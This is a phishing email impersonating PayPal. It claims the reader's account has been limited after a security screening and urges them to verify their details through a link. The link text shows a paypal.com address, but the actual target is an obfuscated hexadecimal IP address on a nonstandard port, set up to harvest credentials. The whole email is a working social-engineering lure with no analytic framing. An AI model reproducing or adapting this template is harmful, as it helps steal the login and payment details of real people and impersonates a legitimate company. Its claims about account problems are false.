 Dear PayPal Member, As part of our security measures, we regularly screen activity in the PayPal system. During a recent screening, we noticed an issue regarding your account. For your protection, we have limited access to your account until additional security measures can be completed. We apologize for any inconvenience this may cause. This might be due to either of the following reasons: 1. A recent change in your personal information (i.e. change of address, e-mail address). 2. An inability to accurately verify your selected option of payment due to an internal error within our processors. Please update and verify your information by checking the link below: https://www.paypal.com/cgi_bin/websc?cmd=Login (http://0xD5.0xB8.0xAC.0xE3:1280/pp/onlineupdate/index.php) We thank you for your prompt attention to this matter.
